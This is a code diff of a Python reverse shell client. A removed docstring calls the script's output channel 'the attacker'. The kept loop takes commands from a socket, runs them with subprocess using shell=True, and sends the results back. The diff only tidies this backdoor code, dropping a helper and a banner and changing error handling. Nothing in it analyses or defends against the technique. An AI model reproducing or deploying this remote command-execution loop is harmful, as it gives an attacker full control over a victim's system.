@@ -19,30 +19,18 @@ def execute_command(command:str):
 	return subprocess.check_output(command, shell=True)
 
 
-def send_data(data):
-	'''
-	send data to the attacker.
-	'''
-	if type(data) == str:
-		data = data.encode('utf-8')
-	connection.send(data)
-
-
-send_data('\n[+] Connection has been established.\n\n'.encode('utf-8'))
-
 while True:
 	try:
-		send_data('\n[*] command >> '.encode('utf-8'))
 		command = connection.recv(1024).decode('utf-8')
 		command_output = execute_command(command)
-		send_data(command_output)
+		connection.send(command_output)
 
-	except KeyboardInterrupt:
-		print('[!] ctrl+c detected!')
+	except ConnectionResetError:
+		print('[-] Lost Connection.')
 		sys.exit()
 
 	except Exception as e:
-		send_data('[-] Exception : ' + str(e))
+		print('[-] Exception : ' + str(e))
 
 
 # closing connection.
